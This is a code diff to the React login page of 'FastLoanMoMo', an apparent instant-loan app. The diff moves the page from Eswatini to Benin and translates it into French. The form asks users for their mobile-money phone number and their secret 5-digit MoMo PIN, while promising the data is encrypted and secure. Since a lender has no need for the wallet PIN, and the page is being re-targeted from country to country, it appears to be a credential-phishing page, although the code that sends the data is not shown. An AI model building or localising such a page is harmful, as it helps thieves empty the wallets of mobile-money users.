@@ -10,7 +10,8 @@ const Login = () => {
   const [showPin, setShowPin] = useState(false);
   const navigate = useNavigate();
 
-  const isFormValid = phone.length >= 8 && pin.length === 5;
+  // Benin phone numbers are 10 digits
+  const isFormValid = phone.length === 10 && pin.length === 5;
 
   const handleLogin = async (e: FormEvent) => {
     e.preventDefault();
@@ -34,35 +35,36 @@ const Login = () => {
       <div className="header">
         <div className="header-icon"><Wallet size={32} color="white" /></div>
         <h1 className="header-title">FastLoan<span>MoMo</span></h1>
-        <p className="header-subtitle">Instant mobile money loans</p>
+        <p className="header-subtitle">Prêts mobiles instantanés</p>
       </div>
 
       <div className="main-card">
-        <h2 className="title">Welcome back</h2>
-        <p className="subtitle">Sign in with your mobile money number to access instant loans.</p>
+        <h2 className="title">Bon retour</h2>
+        <p className="subtitle">Connectez-vous avec votre numéro mobile pour accéder aux prêts instantanés.</p>
         
         <form onSubmit={handleLogin}>
           <div className="form-group">
-            <label className="form-label">Phone number</label>
+            <label className="form-label">Numéro de téléphone</label>
             <div className="input-wrapper" style={{ padding: '12px 16px' }}>
               <span style={{ display: 'flex', alignItems: 'center', fontSize: '16px', fontWeight: 500, color: '#111827' }}>
-                🇸🇿 +268 
+                🇧🇯 +229 
                 <span style={{ color: '#D1D5DB', margin: '0 12px', fontWeight: 300 }}>|</span>
               </span>
               <input
                 type="tel"
-                placeholder="761 234 567"
+                placeholder="01 23 45 67 89"
                 value={phone}
-                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
+                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))}
+                maxLength={10}
                 required
                 style={{ fontSize: '18px', letterSpacing: '1px', color: '#111827', WebkitTextFillColor: '#111827' }}
               />
             </div>
-            <p className="helper-text">Eswatini MTN money number</p>
+            <p className="helper-text">Numéro MoMo du Bénin (10 chiffres)</p>
           </div>
 
           <div className="form-group">
-            <label className="form-label">Enter 5-digit MOMO PIN</label>
+            <label className="form-label">Entrez le code PIN MOMO à 5 chiffres</label>
             <div className="input-wrapper">
               <Lock size={20} color="#6B7280" style={{ marginRight: '12px' }} />
               <input
@@ -91,17 +93,17 @@ const Login = () => {
               marginTop: '32px'
             }}
           >
-            Continue
+            Continuer
           </button>
 
           <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
-            <ShieldCheck size={16} /> Your details are encrypted and secure
+            <ShieldCheck size={16} /> Vos informations sont cryptées et sécurisées
           </p>
         </form>
       </div>
       
-      <p style={{ textAlign: 'center', fontSize: '13px', color: '#4B5563', marginTop: '24px', padding: '0 20px 40px' }}>
-        By continuing you agree to our Terms and Privacy Policy.
+      <p style={{ textAlign: 'center', fontSize: '13px', color: '#111827', marginTop: '24px', padding: '0 20px 40px', fontWeight: 500 }}>
+        En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
       </p>
     </div>
   );
